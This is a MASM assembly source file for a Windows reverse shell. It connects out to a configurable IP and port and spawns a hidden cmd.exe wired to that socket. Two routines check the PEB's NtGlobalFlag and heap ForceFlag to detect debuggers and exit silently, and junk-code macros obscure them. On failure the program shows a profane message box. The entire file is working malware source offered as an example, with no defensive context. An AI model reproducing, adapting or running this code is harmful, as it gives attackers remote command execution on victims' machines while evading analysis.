TITLE reverse shell for windows (revershell.asm)
.486
.model flat, stdcall
option casemap:none
assume fs:nothing

COMMENT @
    Example of reverse shell for Windows, we program it in ASM to 
    have less compiler garbage code

    If compiler does not detect local variables, does not insert
    prologue nor epilogue in the function, but it is mandatory to
    insert return with size of parameters

    Author: Fare9
@

; INCLUDES to use
INCLUDE \MASM32\INCLUDE\Ws2_32.inc
INCLUDE \MASM32\INCLUDE\kernel32.inc
INCLUDE \MASM32\INCLUDE\user32.inc
INCLUDE \MASM32\INCLUDE\windows.inc
INCLUDE structures.inc
INCLUDE macros.inc

; LIBS to use
INCLUDELIB \MASM32\LIB\Ws2_32.lib
INCLUDELIB \MASM32\LIB\kernel32.lib
INCLUDELIB \MASM32\LIB\user32.lib


DEFAULT_BUFLEN  = 512

create_socket_function PROTO :DWORD, :DWORD
checkNtHeader PROTO
checkHeapHeader PROTO

.data
    ;==================== Data for socket
    ; ip & puerto
    IP              BYTE    '127.0.0.1',0
    PORT            DWORD   8081
    ; spec of wVersionRequested 2.2
    wVersionRequested    DWORD  00000202h
    lpWSAData       WSAData <>
    s1              DWORD   0
    hax             sockaddr_in <>
        

    ;==================== Data for MessageBoxA
    message     BYTE 'Bad...Bad...Bad',0
    titulo      BYTE 'Fuck You :)',0

    ;==================== Data for CreateProcessA
    CommandLine BYTE 'cmd',0
    lpStartupInfo   STARTUPINFO <>
    lpProcessInformation PROCESS_INFORMATION <>

    ;==================== to save FS
    fs_value    DWORD   0h

    code_size   EQU final - @_start
.code
@_start:
    invoke checkNtHeader

    invoke create_socket_function, ADDR IP, PORT
    
    invoke checkHeapHeader

    mov edx, s1
    
    mov lpStartupInfo.cb, SIZEOF lpStartupInfo
    mov lpStartupInfo.dwFlags, 0101h
    mov lpStartupInfo.wShowWindow, SW_HIDE
    mov lpStartupInfo.hStdInput, edx
    mov lpStartupInfo.hStdError, edx
    mov lpStartupInfo.hStdOutput, edx

    invoke CreateProcessA, NULL, ADDR CommandLine, NULL, NULL, 1, NULL, NULL, NULL, ADDR lpStartupInfo, ADDR lpProcessInformation
    .if eax == 0
        invoke closesocket, s1
        mov s1,INVALID_SOCKET
        invoke MessageBoxA, NULL,ADDR message, ADDR titulo, MB_OK
        invoke WSACleanup
        invoke ExitProcess,-1
    .endif
    invoke ExitProcess,0
    
    create_socket_function PROC ipis:DWORD, portos:DWORD
        invoke WSAStartup, wVersionRequested, ADDR lpWSAData
            
        .if eax != 0
            invoke MessageBoxA, NULL,ADDR message, ADDR titulo, MB_OK
            invoke ExitProcess,-1
        .endif

        .if lpWSAData.wVersion != 0202h
            invoke MessageBoxA, NULL,ADDR message, ADDR titulo, MB_OK
            invoke ExitProcess,-1
        .endif

        invoke WSASocket, AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL
        mov s1,eax

        mov hax.sin_family, AF_INET
        invoke htons,portos
        mov hax.sin_port, ax
            
        invoke inet_addr,ipis
        mov hax.sin_addr.S_un.S_addr, eax

        invoke WSAConnect, s1, ADDR hax, SIZEOF hax, NULL, NULL, NULL, NULL 
        .if eax != 0
            invoke MessageBoxA, NULL,ADDR message, ADDR titulo, MB_OK
            invoke ExitProcess,-1
        .endif
        
        ret 8
    create_socket_function ENDP

    checkNtHeader PROC
        push ebp 
        mov ebp, esp

        mov eax, fs:[30h] ; get PEB
        junk_code_1 eax
        mov al, [eax+68h] ; NT Global Flags
        and al, 70h
        .if al == 70h
            junk_code_2
            invoke ExitProcess, 0
        .endif    

        leave
        ret
    checkNtHeader ENDP

    checkHeapHeader PROC
        push ebp
        mov ebp, esp

        mov ebx, 20h
        junk_code_3 ebx
        add ebx, 10h
        mov eax,  fs:[ebx]
        mov fs_value, eax
        junk_code_1 eax
        mov eax,fs_value ; get PEB
        mov ebx, [eax + 18h] ; get ProcessHeap
        mov ebx, [ebx + 44h] ; get ForceFlag
        .if ebx != 0
            junk_code_2
            invoke ExitProcess,0
        .endif

        leave
        ret
    checkHeapHeader ENDP

final:
END @_start